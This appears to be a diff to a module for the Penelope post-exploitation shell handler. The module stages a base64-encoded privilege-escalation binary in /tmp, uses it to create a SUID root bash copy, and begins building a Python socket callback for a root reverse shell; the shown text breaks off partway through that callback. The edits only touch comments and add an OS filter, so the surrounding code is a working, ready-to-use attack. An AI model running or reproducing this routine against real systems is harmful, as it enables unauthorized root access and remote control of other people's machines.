@@ -5,6 +5,7 @@ class copyfail(penelope.Module):
 
     # Module category shown in `run` listing
     category = "Privilege Escalation"
+    os_filter = 'Unix'
 
     # Set True to auto-run when a session is first established
     on_session_start = False
@@ -32,7 +33,7 @@ class copyfail(penelope.Module):
         _here = _os.path.dirname(_os.path.abspath(__file__))
         COPYFAIL_B64 = open(_os.path.join(_here, "b64_binaries", "copyfail.b64")).read().strip()
 
-        # Stage exploit — value=True blocks until write completes
+        # Stage exploit - value=True blocks until write completes
         staged = session.exec(
             f"echo '{COPYFAIL_B64}' | base64 -d > /tmp/copyfail && chmod +x /tmp/copyfail && echo staged",
             value=True
@@ -41,7 +42,7 @@ class copyfail(penelope.Module):
             penelope.logger.error("Failed to stage exploit binary")
             return
 
-        # Pipe command into exploit stdin — patched su drops root shell reading from stdin
+        # Pipe command into exploit stdin - patched su drops root shell reading from stdin
         # (penelope raw sessions have no /dev/tty so root shell falls back to pipe stdin)
         session.exec("echo 'cp /bin/bash /tmp/rootsh && chmod 4755 /tmp/rootsh' | /tmp/copyfail", value=False)
 
@@ -54,12 +55,12 @@ class copyfail(penelope.Module):
             import time; time.sleep(1)
 
         if not suid_check or "rwsr" not in suid_check:
-            penelope.logger.error("SUID shell not created — exploit failed")
+            penelope.logger.error("SUID shell not created - exploit failed")
             return
 
-        print("[+] SUID shell created — writing root callback")
+        print("[+] SUID shell created - writing root callback")
         # rootsh -p = EUID=0, RUID=marco; python3 setuid(0) collapses to true root
-        # use python3 socket directly — no /dev/tcp bash dependency
+        # use python3 socket directly - no /dev/tcp bash dependency
         import base64 as _b64
         cb = (
             f"import os,socket,subprocess\n"
